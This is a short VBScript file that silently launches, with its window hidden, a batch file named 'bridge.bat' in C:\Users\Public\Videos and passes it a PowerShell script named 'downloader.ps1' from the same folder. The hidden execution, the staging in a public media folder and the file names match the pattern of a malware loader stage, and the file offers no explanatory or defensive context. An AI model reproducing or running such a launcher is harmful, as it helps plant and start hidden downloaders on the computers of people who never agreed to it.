Set objShell = CreateObject("WScript.Shell")

Dim batchFilePath, parameter
batchFilePath = "C:\Users\Public\Videos\bridge.bat"
parameter = "C:\Users\Public\Videos\downloader.ps1"

objShell.Run "cmd.exe /c " & batchFilePath & " " & parameter,  0, False